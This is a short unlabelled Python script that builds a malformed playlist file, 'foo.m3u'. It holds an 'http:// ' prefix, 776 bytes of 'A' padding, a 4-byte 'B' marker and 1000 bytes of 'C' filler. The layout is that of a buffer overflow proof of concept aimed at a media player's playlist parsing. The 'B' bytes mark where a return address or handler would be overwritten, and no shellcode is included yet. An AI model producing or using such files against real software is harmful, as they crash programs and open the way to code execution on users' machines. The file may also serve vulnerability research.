#!/usr/bin/python

buff = "http:// "
buff += "A"*776
buff += "B"*4
buff += "C"*1000

fo = open("foo.m3u", "wb")
fo.write (buff)
fo.close()
